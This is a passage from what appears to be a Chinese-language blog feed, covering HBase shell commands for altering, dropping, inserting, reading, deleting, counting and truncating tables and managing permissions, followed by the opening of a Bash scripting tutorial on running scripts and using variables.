<p>在下面的例子中，我们已经设置表emp为只读。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; alter &apos;emp&apos;, READONLY</span><br><span class="line">Updating all regions with the new schema...</span><br><span class="line">0/1 regions updated.</span><br><span class="line">1/1 regions updated.</span><br><span class="line">Done.</span><br><span class="line">0 row(s) in 2.2140 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="删除表范围运算符"><a href="#删除表范围运算符" class="headerlink" title="删除表范围运算符"></a>删除表范围运算符</h2><p>也可以删除表范围运算。下面给出的是语法，从emp表中删除“MAX_FILESIZE”。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; alter &apos;t1&apos;, METHOD =&gt; &apos;table_att_unset&apos;, NAME =&gt; &apos;MAX_FILESIZE&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="删除列族"><a href="#删除列族" class="headerlink" title="删除列族"></a>删除列族</h2><p>使用alter，也可以删除列族。下面给出的是使用alter删除列族的语法。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; alter ‘ table name ’, ‘delete’ =&gt; ‘ column family ’</span><br></pre></td></tr></table></figure></p>
<p>下面给出的是一个例子，从“emp”表中删除列族。</p>
<p>假设在HBase中有一个employee表。它包含以下数据：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; scan &apos;employee&apos;</span><br><span class="line"></span><br><span class="line">         ROW                   COLUMN+CELL</span><br><span class="line"></span><br><span class="line">row1 column=personal:city, timestamp=1418193767, value=hyderabad</span><br><span class="line"></span><br><span class="line">row1 column=personal:name, timestamp=1418193806767, value=raju</span><br><span class="line"></span><br><span class="line">row1 column=professional:designation, timestamp=1418193767, value=manager</span><br><span class="line"></span><br><span class="line">row1 column=professional:salary, timestamp=1418193806767, value=50000</span><br><span class="line"></span><br><span class="line">1 row(s) in 0.0160 seconds</span><br></pre></td></tr></table></figure></p>
<p>现在使用alter命令删除指定的 professional 列族。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):007:0&gt; alter &apos;employee&apos;,&apos;delete&apos;=&gt;&apos;professional&apos;</span><br><span class="line">Updating all regions with the new schema...</span><br><span class="line">0/1 regions updated.</span><br><span class="line">1/1 regions updated.</span><br><span class="line">Done.</span><br><span class="line">0 row(s) in 2.2380 seconds</span><br></pre></td></tr></table></figure></p>
<p>现在验证该表中变更后的数据。观察列族“professional”也没有了，因为前面已经被删除了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):003:0&gt; scan &apos;employee&apos;</span><br><span class="line"> ROW             COLUMN+CELL</span><br><span class="line">row1 column=personal:city, timestamp=14181936767, value=hyderabad</span><br><span class="line"></span><br><span class="line">row1 column=personal:name, timestamp=1418193806767, value=raju</span><br><span class="line"></span><br><span class="line">1 row(s) in 0.0830 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="HBase-Exists"><a href="#HBase-Exists" class="headerlink" title="HBase Exists"></a>HBase Exists</h2><p>可以使用exists命令验证表的存在。下面的示例演示了如何使用这个命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):024:0&gt; exists &apos;emp&apos;</span><br><span class="line">Table emp does exist</span><br><span class="line"></span><br><span class="line">0 row(s) in 0.0750 seconds</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">hbase(main):015:0&gt; exists &apos;student&apos;</span><br><span class="line">Table student does not exist</span><br><span class="line"></span><br><span class="line">0 row(s) in 0.0480 seconds</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase删除表"><a href="#HBase删除表" class="headerlink" title="HBase删除表"></a>HBase删除表</h1><p>用drop命令可以删除表。在删除一个表之前必须先将其禁用。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):018:0&gt; disable &apos;emp&apos;</span><br><span class="line">0 row(s) in 1.4580 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hbase(main):019:0&gt; drop &apos;emp&apos;</span><br><span class="line">0 row(s) in 0.3060 seconds</span><br></pre></td></tr></table></figure></p>
<p>使用exists 命令验证表是否被删除。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):020:0&gt; exists &apos;emp&apos;</span><br><span class="line">Table emp does not exist</span><br><span class="line"></span><br><span class="line">0 row(s) in 0.0730 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="drop-all"><a href="#drop-all" class="headerlink" title="drop_all"></a>drop_all</h2><p>这个命令是用来在给出删除匹配“regex”表。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; drop_all &apos;t.*&apos;</span><br></pre></td></tr></table></figure></p>
<p>注意：要删除表，则必须先将其禁用。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>假设有一些表的名称为raja, rajani, rajendra, rajesh, 和 raju。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):017:0&gt; list</span><br><span class="line">TABLE</span><br><span class="line">raja</span><br><span class="line">rajani</span><br><span class="line">rajendra </span><br><span class="line">rajesh</span><br><span class="line">raju</span><br><span class="line">9 row(s) in 0.0270 seconds</span><br></pre></td></tr></table></figure></p>
<p>所有这些表以字母raj开始。首先使用disable_all命令禁用所有这些表如下所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):002:0&gt; disable_all &apos;raj.*&apos;</span><br><span class="line">raja</span><br><span class="line">rajani</span><br><span class="line">rajendra</span><br><span class="line">rajesh</span><br><span class="line">raju</span><br><span class="line">Disable the above 5 tables (y/n)?</span><br><span class="line">y</span><br><span class="line">5 tables successfully disabled</span><br></pre></td></tr></table></figure></p>
<p>现在，可以使用 drop_all 命令删除它们，如下所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):018:0&gt; drop_all &apos;raj.*&apos;</span><br><span class="line">raja</span><br><span class="line">rajani</span><br><span class="line">rajendra</span><br><span class="line">rajesh</span><br><span class="line">raju</span><br><span class="line"></span><br><span class="line">Drop the above 5 tables (y/n)?</span><br><span class="line"></span><br><span class="line">y</span><br><span class="line">5 tables successfully dropped</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase关闭"><a href="#HBase关闭" class="headerlink" title="HBase关闭"></a>HBase关闭</h1><h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>可以通过键入exit命令退出shell。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):021:0&gt; exit</span><br></pre></td></tr></table></figure></p>
<h2 id="停止HBase"><a href="#停止HBase" class="headerlink" title="停止HBase"></a>停止HBase</h2><p>要停止HBase，浏览进入到HBase主文件夹，然后键入以下命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./bin/stop-hbase.sh</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase创建数据"><a href="#HBase创建数据" class="headerlink" title="HBase创建数据"></a>HBase创建数据</h1><p>本章将介绍如何在HBase表中创建的数据。要在HBase表中创建的数据，可以下面的命令和方法：</p>
<ol>
<li>put 命令,</li>
<li>add() - Put类的方法</li>
<li>put() - HTable 类的方法.</li>
</ol>
<p>作为一个例子，我们将在HBase中创建下表。<br><img src="https://mfaying.github.io/static/images/hbase/5.jpg" alt></p>
<p>使用put命令，可以插入行到一个表。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put ’&lt;table name&gt;’,’row1’,’&lt;colfamily:colname&gt;’,’&lt;value&gt;’</span><br></pre></td></tr></table></figure></p>
<h2 id="插入第一行"><a href="#插入第一行" class="headerlink" title="插入第一行"></a>插入第一行</h2><p>将第一行的值插入到emp表如下所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):005:0&gt; put &apos;emp&apos;,&apos;1&apos;,&apos;personal data:name&apos;,&apos;raju&apos;</span><br><span class="line">0 row(s) in 0.6600 seconds</span><br><span class="line">hbase(main):006:0&gt; put &apos;emp&apos;,&apos;1&apos;,&apos;personal data:city&apos;,&apos;hyderabad&apos;</span><br><span class="line">0 row(s) in 0.0410 seconds</span><br><span class="line">hbase(main):007:0&gt; put &apos;emp&apos;,&apos;1&apos;,&apos;professional</span><br><span class="line">data:designation&apos;,&apos;manager&apos;</span><br><span class="line">0 row(s) in 0.0240 seconds</span><br><span class="line">hbase(main):007:0&gt; put &apos;emp&apos;,&apos;1&apos;,&apos;professional data:salary&apos;,&apos;50000&apos;</span><br><span class="line">0 row(s) in 0.0240 seconds</span><br></pre></td></tr></table></figure></p>
<p>以相同的方式使用put命令插入剩余的行。如果插入完成整个表格，会得到下面的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):022:0&gt; scan &apos;emp&apos;</span><br><span class="line"></span><br><span class="line">   ROW                        COLUMN+CELL</span><br><span class="line">1 column=personal data:city, timestamp=1417524216501, value=hyderabad</span><br><span class="line"></span><br><span class="line">1 column=personal data:name, timestamp=1417524185058, value=ramu</span><br><span class="line"></span><br><span class="line">1 column=professional data:designation, timestamp=1417524232601,</span><br><span class="line"></span><br><span class="line"> value=manager</span><br><span class="line"> </span><br><span class="line">1 column=professional data:salary, timestamp=1417524244109, value=50000</span><br><span class="line"></span><br><span class="line">2 column=personal data:city, timestamp=1417524574905, value=chennai</span><br><span class="line"></span><br><span class="line">2 column=personal data:name, timestamp=1417524556125, value=ravi</span><br><span class="line"></span><br><span class="line">2 column=professional data:designation, timestamp=1417524592204,</span><br><span class="line"></span><br><span class="line"> value=sr:engg</span><br><span class="line"> </span><br><span class="line">2 column=professional data:salary, timestamp=1417524604221, value=30000</span><br><span class="line"></span><br><span class="line">3 column=personal data:city, timestamp=1417524681780, value=delhi</span><br><span class="line"></span><br><span class="line">3 column=personal data:name, timestamp=1417524672067, value=rajesh</span><br><span class="line"></span><br><span class="line">3 column=professional data:designation, timestamp=1417524693187,</span><br><span class="line"></span><br><span class="line">value=jr:engg</span><br><span class="line">3 column=professional data:salary, timestamp=1417524702514,</span><br><span class="line"></span><br><span class="line">value=25000</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase更新数据"><a href="#HBase更新数据" class="headerlink" title="HBase更新数据"></a>HBase更新数据</h1><p>可以使用put命令更新现有的单元格值。按照下面的语法，并注明新值，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put ‘table name’,’row ’,&apos;Column family:column name&apos;,’new value’</span><br></pre></td></tr></table></figure></p>
<p>新给定值替换现有的值，并更新该行。</p>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>假设HBase中有一个表emp拥有下列数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):003:0&gt; scan &apos;emp&apos;</span><br><span class="line"> ROW              COLUMN+CELL</span><br><span class="line">row1 column=personal:name, timestamp=1418051555, value=raju</span><br><span class="line">row1 column=personal:city, timestamp=1418275907, value=Hyderabad</span><br><span class="line">row1 column=professional:designation, timestamp=14180555,value=manager</span><br><span class="line">row1 column=professional:salary, timestamp=1418035791555,value=50000</span><br><span class="line">1 row(s) in 0.0100 seconds</span><br></pre></td></tr></table></figure>
<p>以下命令将更新名为“Raju’员工的城市值为’Delhi’。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):002:0&gt; put &apos;emp&apos;,&apos;row1&apos;,&apos;personal:city&apos;,&apos;Delhi&apos;</span><br><span class="line">0 row(s) in 0.0400 seconds</span><br></pre></td></tr></table></figure></p>
<p>更新后的表如下所示，观察这个城市Raju的值已更改为“Delhi”。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):003:0&gt; scan &apos;emp&apos;</span><br><span class="line">  ROW          COLUMN+CELL</span><br><span class="line">row1 column=personal:name, timestamp=1418035791555, value=raju</span><br><span class="line">row1 column=personal:city, timestamp=1418274645907, value=Delhi</span><br><span class="line">row1 column=professional:designation, timestamp=141857555,value=manager</span><br><span class="line">row1 column=professional:salary, timestamp=1418039555, value=50000</span><br><span class="line">1 row(s) in 0.0100 seconds</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase读取数据"><a href="#HBase读取数据" class="headerlink" title="HBase读取数据"></a>HBase读取数据</h1><p>get命令和HTable类的get()方法用于从HBase表中读取数据。使用 get 命令，可以同时获取一行数据。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get ’&lt;table name&gt;’,’row1’</span><br></pre></td></tr></table></figure></p>
<p>下面的例子说明如何使用get命令。扫描emp表的第一行。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):012:0&gt; get &apos;emp&apos;, &apos;1&apos;</span><br><span class="line"></span><br><span class="line">   COLUMN                     CELL</span><br><span class="line">   </span><br><span class="line">personal : city timestamp=1417521848375, value=hyderabad</span><br><span class="line"></span><br><span class="line">personal : name timestamp=1417521785385, value=ramu</span><br><span class="line"></span><br><span class="line">professional: designation timestamp=1417521885277, value=manager</span><br><span class="line"></span><br><span class="line">professional: salary timestamp=1417521903862, value=50000</span><br><span class="line"></span><br><span class="line">4 row(s) in 0.0270 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="读取指定列"><a href="#读取指定列" class="headerlink" title="读取指定列"></a>读取指定列</h2><p>下面给出的是语法，使用get方法读取指定列。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt;get &apos;table name&apos;, ‘rowid’, &#123;COLUMN =&gt; ‘column family:column name ’&#125;</span><br></pre></td></tr></table></figure>
<p>下面给出的示例，是用于读取HBase表中的特定列。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):015:0&gt; get &apos;emp&apos;, &apos;row1&apos;, &#123;COLUMN=&gt;&apos;personal:name&apos;&#125;</span><br><span class="line"></span><br><span class="line">  COLUMN                CELL</span><br><span class="line">  </span><br><span class="line">personal:name timestamp=1418035791555, value=raju</span><br><span class="line"></span><br><span class="line">1 row(s) in 0.0080 seconds</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase删除数据"><a href="#HBase删除数据" class="headerlink" title="HBase删除数据"></a>HBase删除数据</h1><h2 id="从表删除特定单元格"><a href="#从表删除特定单元格" class="headerlink" title="从表删除特定单元格"></a>从表删除特定单元格</h2><p>使用 delete 命令，可以在一个表中删除特定单元格。 delete 命令的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete ‘&lt;table name&gt;’, ‘&lt;row&gt;’, ‘&lt;column name &gt;’, ‘&lt;time stamp&gt;’</span><br></pre></td></tr></table></figure></p>
<p>下面是一个删除特定单元格和例子。在这里，我们删除salary<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; delete &apos;emp&apos;, &apos;1&apos;, &apos;personal data:city&apos;,</span><br><span class="line">1417521848375</span><br><span class="line">0 row(s) in 0.0060 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="删除表的所有单元格"><a href="#删除表的所有单元格" class="headerlink" title="删除表的所有单元格"></a>删除表的所有单元格</h2><p>使用“deleteall”命令，可以删除一行中所有单元格。下面给出是 deleteall 命令的语法。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deleteall ‘&lt;table name&gt;’, ‘&lt;row&gt;’</span><br></pre></td></tr></table></figure></p>
<p>这里是使用“deleteall”命令删去 emp 表 row1 的所有单元的一个例子。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):007:0&gt; deleteall &apos;emp&apos;,&apos;1&apos;</span><br><span class="line">0 row(s) in 0.0240 seconds</span><br></pre></td></tr></table></figure></p>
<p>使用scan命令验证表。表被删除后的快照如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):022:0&gt; scan &apos;emp&apos;</span><br><span class="line"></span><br><span class="line">ROW                  COLUMN+CELL</span><br><span class="line"></span><br><span class="line">2 column=personal data:city, timestamp=1417524574905, value=chennai </span><br><span class="line"></span><br><span class="line">2 column=personal data:name, timestamp=1417524556125, value=ravi</span><br><span class="line"></span><br><span class="line">2 column=professional data:designation, timestamp=1417524204, value=sr:engg</span><br><span class="line"></span><br><span class="line">2 column=professional data:salary, timestamp=1417524604221, value=30000</span><br><span class="line"></span><br><span class="line">3 column=personal data:city, timestamp=1417524681780, value=delhi</span><br><span class="line"></span><br><span class="line">3 column=personal data:name, timestamp=1417524672067, value=rajesh</span><br><span class="line"></span><br><span class="line">3 column=professional data:designation, timestamp=1417523187, value=jr:engg</span><br><span class="line"></span><br><span class="line">3 column=professional data:salary, timestamp=1417524702514, value=25000</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase扫描-HBase教程™"><a href="#HBase扫描-HBase教程™" class="headerlink" title="HBase扫描 - HBase教程™"></a>HBase扫描 - HBase教程™</h1><p>scan 命令用于查看HTable数据。使用 scan 命令可以得到表中的数据。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scan ‘&lt;table name&gt;’</span><br></pre></td></tr></table></figure></p>
<p>下面的示例演示了如何使用scan命令从表中读取数据。在这里读取的是emp表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):010:0&gt; scan &apos;emp&apos;</span><br><span class="line"></span><br><span class="line">ROW                           COLUMN+CELL</span><br><span class="line"></span><br><span class="line">1 column=personal data:city, timestamp=1417521848375, value=hyderabad</span><br><span class="line"></span><br><span class="line">1 column=personal data:name, timestamp=1417521785385, value=ramu</span><br><span class="line"></span><br><span class="line">1 column=professional data:designation, timestamp=1417585277,value=manager</span><br><span class="line"></span><br><span class="line">1 column=professional data:salary, timestamp=1417521903862, value=50000</span><br><span class="line"></span><br><span class="line">1 row(s) in 0.0370 seconds</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase计数和截断"><a href="#HBase计数和截断" class="headerlink" title="HBase计数和截断"></a>HBase计数和截断</h1><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p>可以使用count命令计算表的行数量。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">count ‘&lt;table name&gt;’</span><br></pre></td></tr></table></figure></p>
<p>删除第一行后，表emp就只有两行。验证它，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):023:0&gt; count &apos;emp&apos;</span><br><span class="line">2 row(s) in 0.090 seconds</span><br><span class="line">=&gt; 2</span><br></pre></td></tr></table></figure></p>
<h2 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h2><p>此命令将禁止删除并重新创建一个表。truncate 的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; truncate &apos;table name&apos;</span><br></pre></td></tr></table></figure></p>
<p>下面给出是 truncate 命令的例子。在这里，我们已经截断了emp表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):011:0&gt; truncate &apos;emp&apos;</span><br><span class="line">Truncating &apos;one&apos; table (it may take a while):</span><br><span class="line">   - Disabling table...</span><br><span class="line">   - Truncating table...</span><br><span class="line">  0 row(s) in 1.5950 seconds</span><br></pre></td></tr></table></figure></p>
<p>截断表之后，使用scan 命令来验证。会得到表的行数为零。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):017:0&gt; scan ‘emp’</span><br><span class="line">ROW                  COLUMN+CELL</span><br><span class="line">0 row(s) in 0.3110 seconds</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase安全"><a href="#HBase安全" class="headerlink" title="HBase安全"></a>HBase安全</h1><p>我们可以授予和撤销HBase用户的权限。也有出于安全目的，三个命令：grant, revoke 和 user_permission.。</p>
<h2 id="grant"><a href="#grant" class="headerlink" title="grant"></a>grant</h2><p>grant命令授予特定的权限，如读，写，执行和管理表给定一个特定的用户。 grant命令的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; grant &lt;user&gt; &lt;permissions&gt; [&lt;table&gt; [&lt;column family&gt; [&lt;column; qualifier&gt;]]</span><br></pre></td></tr></table></figure></p>
<p>我们可以从RWXCA组，其中给予零个或多个特权给用户</p>
<ol>
<li><p>R - 代表读取权限</p>
</li>
<li><p>W - 代表写权限</p>
</li>
<li><p>X - 代表执行权限</p>
</li>
<li><p>C - 代表创建权限</p>
</li>
<li><p>A - 代表管理权限</p>
</li>
</ol>
<p>下面给出是为用户“Tutorialspoint’授予所有权限的例子。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):018:0&gt; grant &apos;Tutorialspoint&apos;, &apos;RWXCA&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="revoke"><a href="#revoke" class="headerlink" title="revoke"></a>revoke</h2><p>revoke命令用于撤销用户访问表的权限。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; revoke &lt;user&gt;</span><br></pre></td></tr></table></figure></p>
<p>下面的代码撤消名为“Tutorialspoint”用户的所有权限。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; revoke &apos;Tutorialspoint&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="user-permission"><a href="#user-permission" class="headerlink" title="user_permission"></a>user_permission</h2><p>此命令用于列出特定表的所有权限。 user_permission的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt;user_permission ‘tablename’</span><br></pre></td></tr></table></figure></p>
<p>下面的代码列出了“emp”表的所有用户权限。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):013:0&gt; user_permission &apos;emp&apos;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title>shell教程</title>
    <url>/2019/07/27/shell%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>参考<a href="https://www.runoob.com/linux/linux-shell.html" target="_blank" rel="noopener">shell教程 | 菜鸟教程</a></p>
<p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。</p>
<p>Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</p>
<a id="more"></a>
<p>Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer 是一个典型的图形界面 Shell。</p>
<h2 id="Shell-脚本"><a href="#Shell-脚本" class="headerlink" title="Shell 脚本"></a>Shell 脚本</h2><p>Shell 脚本（shell script），是一种为 shell 编写的脚本程序。</p>
<p>业界所说的 shell 通常都是指 shell 脚本，但读者朋友要知道，shell 和 shell script 是两个不同的概念。</p>
<p>由于习惯的原因，简洁起见，本文出现的 “shell编程” 都是指 shell 脚本编程，不是指开发 shell 自身。</p>
<h2 id="Shell-环境"><a href="#Shell-环境" class="headerlink" title="Shell 环境"></a>Shell 环境</h2><p>Shell 编程跟 java、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</p>
<p>Linux 的 Shell 种类众多，常见的有：</p>
<p>Bourne Shell（/usr/bin/sh或/bin/sh）<br>Bourne Again Shell（/bin/bash）<br>C Shell（/usr/bin/csh）<br>K Shell（/usr/bin/ksh）<br>Shell for Root（/sbin/sh）<br>……<br>本教程关注的是 Bash，也就是 Bourne Again Shell，由于易用和免费，Bash 在日常工作中被广泛使用。同时，Bash 也是大多数Linux 系统默认的 Shell。</p>
<p>在一般情况下，人们并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 #!/bin/sh，它同样也可以改为 #!/bin/bash。</p>
<p><code>#!</code> 告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 程序。</p>
<h2 id="第一个shell脚本"><a href="#第一个shell脚本" class="headerlink" title="第一个shell脚本"></a>第一个shell脚本</h2><p>打开文本编辑器(可以使用 vi/vim 命令来创建文件)，新建一个文件 test.sh，扩展名为 sh（sh代表shell），扩展名并不影响脚本执行，见名知意就好，如果你用 php 写 shell 脚本，扩展名就用 php 好了。</p>
<p>输入一些代码，第一行一般是这样<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Hello World !&quot;</span><br></pre></td></tr></table></figure></p>
<p><code>#!</code> 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。</p>
<p>echo 命令用于向窗口输出文本。</p>
<h2 id="运行-Shell-脚本有两种方法："><a href="#运行-Shell-脚本有两种方法：" class="headerlink" title="运行 Shell 脚本有两种方法："></a>运行 Shell 脚本有两种方法：</h2><p>1、作为可执行程序</p>
<p>将上面的代码保存为 test.sh，并 cd 到相应目录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x ./test.sh  #使脚本具有执行权限</span><br><span class="line">./test.sh  #执行脚本</span><br></pre></td></tr></table></figure></p>
<p>注意，一定要写成 ./test.sh，而不是 test.sh，运行其它二进制的程序也一样，直接写 test.sh，linux 系统会去 PATH 里寻找有没有叫 test.sh 的，而只有 /bin, /sbin, /usr/bin，/usr/sbin 等在 PATH 里，你的当前目录通常不在 PATH 里，所以写成 test.sh 是会找不到命令的，要用 ./test.sh 告诉系统说，就在当前目录找。</p>
<h2 id="2、作为解释器参数"><a href="#2、作为解释器参数" class="headerlink" title="2、作为解释器参数"></a>2、作为解释器参数</h2><p>这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh test.sh</span><br><span class="line">/bin/php test.php</span><br></pre></td></tr></table></figure></p>
<p>这种方式运行的脚本，不需要在第一行指定解释器信息，写了也没用。</p>
<h2 id="Shell-变量"><a href="#Shell-变量" class="headerlink" title="Shell 变量"></a>Shell 变量</h2><p>定义变量时，变量名不加美元符号（$，PHP语言中变量需要），如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your_name=&quot;runoob.com&quot;</span><br></pre></td></tr></table></figure></p>
<p>注意，变量名和等号之间不能有空格，这可能和你熟悉的所有编程语言都不一样。同时，变量名的命名须遵循如下规则：</p>
<p>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。<br>中间不能有空格，可以使用下划线（_）。<br>不能使用标点符号。<br>不能使用bash里的关键字（可用help命令查看保留关键字）。<br>有效的 Shell 变量名示例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUNOOB</span><br><span class="line">LD_LIBRARY_PATH</span><br><span class="line">_var</span><br><span class="line">var2</span><br></pre></td></tr></table></figure></p>
<p>无效的变量命名：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?var=123</span><br><span class="line">user*name=runoob</span><br></pre></td></tr></table></figure></p>
<p>除了显式地直接赋值，还可以用语句给变量赋值，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for file in `ls /etc`</span><br><span class="line">或</span><br><span class="line">for file in $(ls /etc)</span><br></pre></td></tr></table></figure></p>
<p>以上语句将 /etc 下目录的文件名循环出来。</p>
<h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><p>使用一个定义过的变量，只要在变量名前面加美元符号即可，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your_name=&quot;qinjx&quot;</span><br><span class="line">echo $your_name</span><br><span class="line">echo $&#123;your_name&#125;</span><br></pre></td></tr></table></figure></p>
<p>变量名外面的花括号是可选的，加不加都行，加花括号是为了帮助解释器识别变量的边界，比如下面这种情况：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for skill in Ada Coffe Action Java; do</span><br><span class="line">    echo &quot;I am good at $&#123;skill&#125;Script&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>如果不给skill变量加花括号，写成echo “I am good at $skillScript”，解释器就会把$skillScript当成一个变量（其值为空），代码执行结果就不是我们期望的样子了。</p>
<p>推荐给所有变量加上花括号，这是个好的编程习惯。</p>
<p>已定义的变量，可以被重新定义，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your_name=&quot;tom&quot;</span><br><span class="line">echo $your_name</span><br><span class="line">your_name=&quot;alibaba&quot;</span><br><span class="line">echo $your_name</span><br></pre></td></tr></table></figure></p>
<p>这样写是合法的，但注意，第二次赋值的时候不能写$your_name=”alibaba”，使用变量的时候才加美元符（$）。</p>
<h2 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h2><p>使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。</p>
<p>下面的例子尝试更改只读变量，结果报错：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">myUrl=&quot;http://www.google.com&quot;</span><br><span class="line">readonly myUrl</span><br><span class="line">myUrl=&quot;http://www.runoob.com&quot;</span><br></pre></td></tr></table></figure></p>
<p>运行脚本，结果如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh: NAME: This variable is read only.</span><br></pre></td></tr></table></figure></p>
<h2 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h2><p>使用 unset 命令可以删除变量。语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset variable_name</span><br></pre></td></tr></table></figure></p>
<p>变量被删除后不能再次使用。unset 命令不能删除只读变量。<br>实例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">myUrl=&quot;http://www.runoob.com&quot;</span><br><span class="line">unset myUrl</span><br><span class="line">echo $myUrl</span><br></pre></td></tr></table></figure></p>
<p>以上实例执行将没有任何输出。</p>
